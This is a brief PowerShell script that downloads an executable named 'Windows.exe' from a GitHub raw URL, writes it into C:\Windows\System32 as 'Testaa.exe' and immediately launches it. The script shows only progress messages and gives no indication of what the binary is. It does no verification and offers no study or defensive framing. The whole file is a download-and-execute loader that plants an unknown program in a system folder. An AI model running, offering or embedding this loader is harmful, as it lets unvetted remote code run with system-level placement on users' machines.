$exeUrl = "https://raw.githubusercontent.com/RollbakIsOnline/Puls/blob/main/Windows.exe"
$exePath = "C:\Windows\System32\Testaa.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

$wc = New-Object System.Net.WebClient
$wc.DownloadFileAsync($exeUrl, $exePath)

while ($wc.IsBusy) {
    Start-Sleep -Milliseconds 1000
}

if (Test-Path $exePath) {
    Write-Host "Completed..." -ForegroundColor Green
    Start-Process $exePath
} else {
    Write-Host "Download failed..." -ForegroundColor Red
}
